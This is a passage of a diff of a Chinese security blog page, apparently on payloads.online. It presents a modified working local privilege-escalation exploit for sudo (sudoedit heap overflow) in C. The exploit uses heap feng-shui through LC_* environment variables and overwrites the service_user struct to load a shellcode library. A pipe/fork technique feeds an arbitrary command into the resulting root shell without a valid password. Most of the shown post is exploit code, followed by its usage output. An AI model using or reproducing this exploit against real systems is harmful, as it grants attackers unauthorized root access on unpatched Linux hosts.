+</span></span><span style=display:flex><span>    NULL};
+</span></span></code></pre></div><p>紧接着，需要思考如何传入密码了。</p><blockquote><p>经过测试，即使密码错误的情况下，也能够提权成功。</p></blockquote><p>经过查阅资料，关于execve的特点如下：</p><p>execve创建的进程将会重新初始化堆栈、堆和（初始化和未初始化的）数据段。</p><p>All process attributes are preserved during an execve(), except the following:</p><ul><li>The dispositions of any signals that are being caught are reset to the default (signal(7)).</li><li>Any alternate signal stack is not preserved (sigaltstack(2)).</li><li>Memory mappings are not preserved (mmap(2)).</li><li>Attached System V shared memory segments are detached (shmat(2)).</li><li>POSIX shared memory regions are unmapped (shm_open(3)).</li><li>Open POSIX message queue descriptors are closed(mq_overview(7)).</li><li>Any open POSIX named semaphores are closed (sem_overview(7)).</li><li>POSIX timers are not preserved (timer_create(2)).</li><li>Any open directory streams are closed (opendir(3)).</li><li>Memory locks are not preserved (mlock(2), mlockall(2)).</li><li>Exit handlers are not preserved (atexit(3), on_exit(3)).</li><li>The floating-point environment is reset to the default (see fenv(3)).</li><li>&mldr;.</li></ul><p>这就意味着，在调用execve之前向stdin写入数据，创建后的进程也是读不到的。</p><p>于是我写了一个小例子来测验我的解决办法：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;unistd.h&gt;</span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdlib.h&gt;</span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>(<span style=color:#66d9ef>int</span> argc, <span style=color:#66d9ef>char</span><span style=color:#f92672>**</span> argv)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>int</span> des_p[<span style=color:#ae81ff>2</span>];
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span>(pipe(des_p) <span style=color:#f92672>==</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>) {
+</span></span><span style=display:flex><span>          perror(<span style=color:#e6db74>&#34;Pipe failed&#34;</span>);
+</span></span><span style=display:flex><span>          exit(<span style=color:#ae81ff>1</span>);
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span>(fork() <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>)  <span style=color:#75715e>// 创建一个子进程向stdout管道填入数据
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        {
+</span></span><span style=display:flex><span>            close(STDOUT_FILENO);  <span style=color:#75715e>// 关闭系统输出流
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>            dup(des_p[<span style=color:#ae81ff>1</span>]);         <span style=color:#75715e>// 将系统输出流替换为管道
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>            close(des_p[<span style=color:#ae81ff>0</span>]);       <span style=color:#75715e>// 关闭输入管道
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>            <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span> password <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;test</span><span style=color:#ae81ff>\r\n</span><span style=color:#e6db74>1111&#34;</span>; <span style=color:#75715e>// 设置管道内容
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>            write(des_p[<span style=color:#ae81ff>1</span>],password, strlen(password)); <span style=color:#75715e>// 将内容写到输出管道中
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>            close(des_p[<span style=color:#ae81ff>1</span>]); <span style=color:#75715e>// 关闭输出管道
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span>(fork() <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>)            <span style=color:#75715e>// 创建一个子进程
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        {
+</span></span><span style=display:flex><span>            close(STDIN_FILENO);   <span style=color:#75715e>// 关闭系统输入流
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>            dup(des_p[<span style=color:#ae81ff>0</span>]);         <span style=color:#75715e>// 将系统输入流替换为输入管道
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>            close(des_p[<span style=color:#ae81ff>1</span>]);       <span style=color:#75715e>//  关闭输出管道
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>            close(des_p[<span style=color:#ae81ff>0</span>]);     <span style=color:#75715e>// 关闭输入管道
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>const</span> <span style=color:#66d9ef>char</span><span style=color:#f92672>*</span> prog2[] <span style=color:#f92672>=</span> { <span style=color:#e6db74>&#34;wc&#34;</span>, <span style=color:#e6db74>&#34;-l&#34;</span>, <span style=color:#ae81ff>0</span>}; <span style=color:#75715e>// 执行wc -l 
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>            execvp(prog2[<span style=color:#ae81ff>0</span>], prog2);
+</span></span><span style=display:flex><span>            perror(<span style=color:#e6db74>&#34;execvp of wc failed&#34;</span>);
+</span></span><span style=display:flex><span>            exit(<span style=color:#ae81ff>1</span>);
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        close(des_p[<span style=color:#ae81ff>0</span>]);
+</span></span><span style=display:flex><span>        close(des_p[<span style=color:#ae81ff>1</span>]);
+</span></span><span style=display:flex><span>        wait(<span style=color:#ae81ff>0</span>);
+</span></span><span style=display:flex><span>        wait(<span style=color:#ae81ff>0</span>);
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p><p class=md__image><img src=https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/af6100c0-4f5f-11ec-8c95-00d861bf4abb.png alt=2021-02-10-03-10-12></p></p><p>测试结果正确：2！</p><p>stdin的值为：<code>test\r\n1111</code>，wc -l 命令读取是以<code>\n</code>为每一项分割的，因此返回的是2。</p><p>这个方案可以直接拿到Exploit中，将stdin覆盖，向管道写入<code>密码\n命令</code>，然后把命令传入即可。</p><p>为什么这里是<code>密码\n命令</code>呢？</p><p>是因为第一个<code>\n</code>是为了结束密码的传递，然后开始堆溢出，溢出完成后，后续的命令刚好会传入到Shellcode启动的<code>/bin/sh</code>中。</p><p><p class=md__image><img src=https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/af9a9182-4f5f-11ec-8201-00d861bf4abb.png alt=2021-02-10-03-13-24></p></p><p>修改后的Exploit：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;unistd.h&gt; // execve()</span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;string.h&gt; // strcat()</span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>(<span style=color:#66d9ef>int</span> argc, <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span> argv[]) {
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span>(argc <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>2</span>){
+</span></span><span style=display:flex><span>        printf(<span style=color:#e6db74>&#34;Usage: %s &lt;Command&gt; </span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>,argv[<span style=color:#ae81ff>0</span>]);
+</span></span><span style=display:flex><span>        printf(<span style=color:#e6db74>&#34;[+]Refrence : @Qualys Research Team @Max Kamper </span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>        printf(<span style=color:#e6db74>&#34;[+]Modify by Rvn0xsy@ https://payloads.online</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);	
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span> input_command <span style=color:#f92672>=</span> argv[<span style=color:#ae81ff>1</span>];
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>int</span> nSize <span style=color:#f92672>=</span> strlen(input_command)<span style=color:#f92672>+</span><span style=color:#ae81ff>6</span>;
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span> command <span style=color:#f92672>=</span> malloc(nSize);
+</span></span><span style=display:flex><span>    memset(command,<span style=color:#ae81ff>0x00</span>,nSize);
+</span></span><span style=display:flex><span>    sprintf(command,<span style=color:#e6db74>&#34;test</span><span style=color:#ae81ff>\n\n</span><span style=color:#e6db74>%s</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>,input_command);
+</span></span><span style=display:flex><span>    <span style=color:#75715e>// &#39;buf&#39; size determines size of overflowing chunk.
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#75715e>// This will allocate an 0xf0-sized chunk before the target service_user struct.
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#66d9ef>int</span> i;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>char</span> buf[<span style=color:#ae81ff>0xf0</span>] <span style=color:#f92672>=</span> {<span style=color:#ae81ff>0</span>};
+</span></span><span style=display:flex><span>    memset(buf, <span style=color:#e6db74>&#39;Y&#39;</span>, <span style=color:#ae81ff>0xe0</span>);
+</span></span><span style=display:flex><span>    strcat(buf, <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>char</span><span style=color:#f92672>*</span> sudoedit_argv[] <span style=color:#f92672>=</span> {
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;sudoedit&#34;</span>,
+</span></span><span style=display:flex><span>	    <span style=color:#e6db74>&#34;-S&#34;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;-s&#34;</span>,
+</span></span><span style=display:flex><span>        buf,
+</span></span><span style=display:flex><span>        NULL};
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e>// Use some LC_ vars for heap Feng-Shui.
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#75715e>// This should allocate the target service_user struct in the path of the overflow.
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#66d9ef>char</span> messages[<span style=color:#ae81ff>0xe0</span>] <span style=color:#f92672>=</span> {<span style=color:#e6db74>&#34;LC_MESSAGES=en_GB.UTF-8@&#34;</span>};
+</span></span><span style=display:flex><span>    memset(messages <span style=color:#f92672>+</span> strlen(messages), <span style=color:#e6db74>&#39;A&#39;</span>, <span style=color:#ae81ff>0xb8</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>char</span> telephone[<span style=color:#ae81ff>0x50</span>] <span style=color:#f92672>=</span> {<span style=color:#e6db74>&#34;LC_TELEPHONE=C.UTF-8@&#34;</span>};
+</span></span><span style=display:flex><span>    memset(telephone <span style=color:#f92672>+</span> strlen(telephone), <span style=color:#e6db74>&#39;A&#39;</span>, <span style=color:#ae81ff>0x28</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>char</span> measurement[<span style=color:#ae81ff>0x50</span>] <span style=color:#f92672>=</span> {<span style=color:#e6db74>&#34;LC_MEASUREMENT=C.UTF-8@&#34;</span>};
+</span></span><span style=display:flex><span>    memset(measurement <span style=color:#f92672>+</span> strlen(measurement), <span style=color:#e6db74>&#39;A&#39;</span>, <span style=color:#ae81ff>0x28</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e>// This environment variable will be copied onto the heap after the overflowing chunk.
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#75715e>// Use it to bridge the gap between the overflow and the target service_user struct.
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#66d9ef>char</span> overflow[<span style=color:#ae81ff>0x500</span>] <span style=color:#f92672>=</span> {<span style=color:#ae81ff>0</span>};
+</span></span><span style=display:flex><span>    memset(overflow, <span style=color:#e6db74>&#39;X&#39;</span>, <span style=color:#ae81ff>0x4cf</span>);
+</span></span><span style=display:flex><span>    strcat(overflow, <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e>// Overwrite the &#39;files&#39; service_user struct&#39;s name with the path of our shellcode library.
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#75715e>// The backslashes write nulls which are needed to dodge a couple of crashes.
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#66d9ef>char</span><span style=color:#f92672>*</span> envp[] <span style=color:#f92672>=</span> {
+</span></span><span style=display:flex><span>        overflow,
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>&#34;</span>, <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>&#34;</span>, <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>&#34;</span>, <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>&#34;</span>, <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>&#34;</span>, <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>&#34;</span>, <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>&#34;</span>, <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>&#34;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;XXXXXXX</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>&#34;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>&#34;</span>, <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>&#34;</span>, <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>&#34;</span>, <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>&#34;</span>, <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>&#34;</span>, <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>&#34;</span>, <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>&#34;</span>, <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>&#34;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>&#34;</span>, <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>&#34;</span>, <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>&#34;</span>, <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>&#34;</span>, <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>&#34;</span>, <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>&#34;</span>, <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>&#34;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;x/x</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>&#34;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;Z&#34;</span>,
+</span></span><span style=display:flex><span>        messages,
+</span></span><span style=display:flex><span>        telephone,
+</span></span><span style=display:flex><span>        measurement,
+</span></span><span style=display:flex><span>        NULL};
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>int</span> des_p[<span style=color:#ae81ff>2</span>];
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span>(pipe(des_p) <span style=color:#f92672>==</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>){
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>		puts(<span style=color:#e6db74>&#34;Error .. pipe </span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>		<span style=color:#66d9ef>return</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>;
+</span></span><span style=display:flex><span>	}
+</span></span><span style=display:flex><span>	
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span>(fork() <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>)   
+</span></span><span style=display:flex><span>        {
+</span></span><span style=display:flex><span>            close(STDOUT_FILENO);
+</span></span><span style=display:flex><span>            dup(des_p[<span style=color:#ae81ff>1</span>]);  
+</span></span><span style=display:flex><span>            close(des_p[<span style=color:#ae81ff>0</span>]); 
+</span></span><span style=display:flex><span>	    write(des_p[<span style=color:#ae81ff>1</span>],command, strlen(command));
+</span></span><span style=display:flex><span>            close(des_p[<span style=color:#ae81ff>1</span>]);
+</span></span><span style=display:flex><span>	    exit(<span style=color:#ae81ff>1</span>);
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span>(fork()<span style=color:#f92672>==</span><span style=color:#ae81ff>0</span>){
+</span></span><span style=display:flex><span>		close(STDIN_FILENO); 
+</span></span><span style=display:flex><span>		dup(des_p[<span style=color:#ae81ff>0</span>]);  
+</span></span><span style=display:flex><span>		close(des_p[<span style=color:#ae81ff>1</span>]); 
+</span></span><span style=display:flex><span>		close(des_p[<span style=color:#ae81ff>0</span>]);
+</span></span><span style=display:flex><span>		
+</span></span><span style=display:flex><span>		execve(<span style=color:#e6db74>&#34;/usr/bin/sudoedit&#34;</span>, sudoedit_argv, envp);
+</span></span><span style=display:flex><span>		perror(<span style=color:#e6db74>&#34;execvp of stdread failed&#34;</span>);
+</span></span><span style=display:flex><span>		exit(<span style=color:#ae81ff>1</span>);
+</span></span><span style=display:flex><span>	}
+</span></span><span style=display:flex><span>	close(des_p[<span style=color:#ae81ff>0</span>]);
+</span></span><span style=display:flex><span>	close(des_p[<span style=color:#ae81ff>1</span>]);
+</span></span><span style=display:flex><span>	wait(<span style=color:#ae81ff>0</span>);
+</span></span><span style=display:flex><span>	wait(<span style=color:#ae81ff>0</span>);
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><h2 id=0x03-演示效果>0x03 演示效果</h2><pre tabindex=0><code>Usage: ./exploit &lt;Command&gt; 
 [+]Refrence : @Qualys Research Team @Max Kamper 
 [+]Modify by Rvn0xsy@ https://payloads.online
-</code></pre><p><p class="md__image">
-    
-    <img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/aff69068-4f5f-11ec-aa00-00d861bf4abb.png" alt="2021-02-10-03-18-26"  />
-  </p></p>
-
-</div>
-<div class="container">
-    <script src="https://giscus.app/client.js"
-    data-repo="Rvn0xsy/rvn0xsy.github.io"
-    data-repo-id="MDEwOlJlcG9zaXRvcnk0MDEyMzI3MTY="
-    data-category="General"
-    data-category-id="DIC_kwDOF-pTTM4CRDk_"
-    data-mapping="title"
-    data-strict="0"
-    data-reactions-enabled="1"
-    data-emit-metadata="0"
-    data-input-position="bottom"
-    data-theme="dark_tritanopia"
-    data-lang="zh-CN"
-    data-loading="lazy"
-    crossorigin="anonymous"
-    async>
-  </script>
-</div>
-<div class="container">
-    <section class="bio" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-    <div class="bio__blurb">
-        <h2 class="site-h2">网络安全爱好者、安全工具开发者</h2>
-        <p>现阶段在进行红队相关的工作，我的博客会记录一些我的学习过程和部分安全技术研究成果。</p>
-    </div>
-<div class="bio__avatar">
-    <img src="/avatar.jpeg" alt="Duncan McDougall and heir apparent">
-</div></section>
-</div>
-
-        </div>
-<footer class="site-footer">
-    <div class="container">
-        <div class="site-footer__col">
-        <h5>Get in touch</h5>
-        <p>
-            If you like my project or have some questions,feel free
-            to contact me</a>.
-        </p>
-        </div>
-        <div class="site-footer__col site-footer__col--links">
-        <h5>Me Elsewhere</h5>
-        <ul>
-        
-                <li>
-                    <a href="https://twitter.com/Rvn0xsy"><i class="fab fa-twitter"></i> Twitter</a>
-                    
-                </li>
-        
-                <li>
-                    <a href="mailto:rvn0xsy@gmail.com"><i class="fas fa-envelope"></i> E-mail</a>
-                    
-                </li>
-        
-                <li>
-                    <a href="https://github.com/Rvn0xsy"><i class="fab fa-github"></i> Github</a>
-                    
-                </li>
-        
-        </ul>
-        </div>
-        <div class="site-footer__col site-footer__col--links">
-        <h5>Meta Links</h5>
-        <ul>
-            
-                
-                
-                    <li class="">
-                        <a href="/projects/"><i class="fas fa-code"></i> Projects</a>
-                    </li>
-                
-                    <li class="">
-                        <a href="/links/"><i class="fas fa-link"></i> Links</a>
-                    </li>
-                
-                    <li class="">
-                        <a href="/post/"><i class="fa fa-file-alt"></i> Posts</a>
-                    </li>
-                
-                    <li class="">
-                        <a href="/index.xml"><i class="fa fa-rss-square"></i> Rss</a>
-                    </li>
-                
-                    <li class="">
-                        <a href="/tools/"><i class="fas fa-tools"></i> Tools</a>
-                    </li>
-                
-            
-        </ul>
-        </div>
-        <p class="site-footer__copyright">
-        © 倾旋 2021. All rights reserved.
-        </p>
-    </div>
-    </footer>
-
-
-
-<script src="https://cdn.jsdelivr.net/gh/jmnote/plantuml-encoder@1.2.4/dist/plantuml-encoder.min.js" integrity="sha256-Qsk2KRBCN5qVZX7B+8+2IvQl1Aqc723qV1tBCQaVoqo=" crossorigin="anonymous"></script>
-<script>
-(function(){
-  let plantumlPrefix = "language-plantuml";
-  Array.prototype.forEach.call(document.querySelectorAll("[class^=" + plantumlPrefix + "]"), function(code){
-    let image = document.createElement("IMG");
-    image.loading = 'lazy'; 
-    image.src = 'http://www.plantuml.com/plantuml/svg/~1' + plantumlEncoder.encode(code.innerText);
-    code.parentNode.insertBefore(image, code);
-    code.style.display = 'none';
-  });
-})();
-</script>
-
-</body>
-</html>
+</code></pre><p><p class=md__image><img src=https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/aff69068-4f5f-11ec-aa00-00d861bf4abb.png alt=2021-02-10-03-18-26></p></p></div><div class=container><script src=https://giscus.app/client.js data-repo=Rvn0xsy/rvn0xsy.github.io data-repo-id="MDEwOlJlcG9zaXRvcnk0MDEyMzI3MTY=" data-category=General data-category-id=DIC_kwDOF-pTTM4CRDk_ data-mapping=title data-strict=0 data-reactions-enabled=1 data-emit-metadata=0 data-input-position=bottom data-theme=dark_tritanopia data-lang=zh-CN data-loading=lazy crossorigin=anonymous async></script></div><div class=container><section class=bio itemprop=author itemscope itemtype=http://schema.org/Person><div class=bio__blurb><h2 class=site-h2>网络安全爱好者、安全工具开发者</h2><p>现阶段在进行红队相关的工作，我的博客会记录一些我的学习过程和部分安全技术研究成果。</p></div><div class=bio__avatar><img src=/avatar.jpeg alt="Duncan McDougall and heir apparent"></div></section></div></div><footer class=site-footer><div class=container><div class=site-footer__col><h5>Get in touch</h5><p>If you like my project or have some questions,feel free
+to contact me</a>.</p></div><div class="site-footer__col site-footer__col--links"><h5>Me Elsewhere</h5><ul><li><a href=https://twitter.com/Rvn0xsy><i class="fab fa-twitter"></i> Twitter</a></li><li><a href=mailto:rvn0xsy@gmail.com><i class="fas fa-envelope"></i> E-mail</a></li><li><a href=https://github.com/Rvn0xsy><i class="fab fa-github"></i> Github</a></li></ul></div><div class="site-footer__col site-footer__col--links"><h5>Meta Links</h5><ul><li><a href=/projects/><i class="fas fa-code"></i> Projects</a></li><li><a href=/links/><i class="fas fa-link"></i> Links</a></li><li><a href=/post/><i class="fa fa-file-alt"></i> Posts</a></li><li><a href=/index.xml><i class="fa fa-rss-square"></i> Rss</a></li><li><a href=/tools/><i class="fas fa-tools"></i> Tools</a></li></ul></div><p class=site-footer__copyright>© 倾旋 2021. All rights reserved.</p></div></footer><script src=https://cdn.jsdelivr.net/gh/jmnote/plantuml-encoder@1.2.4/dist/plantuml-encoder.min.js integrity="sha256-Qsk2KRBCN5qVZX7B+8+2IvQl1Aqc723qV1tBCQaVoqo=" crossorigin=anonymous></script>
+<script>(function(){let e="language-plantuml";Array.prototype.forEach.call(document.querySelectorAll("[class^="+e+"]"),function(e){let t=document.createElement("IMG");t.loading="lazy",t.src="http://www.plantuml.com/plantuml/svg/~1"+plantumlEncoder.encode(e.innerText),e.parentNode.insertBefore(t,e),e.style.display="none"})})()</script></body></html>
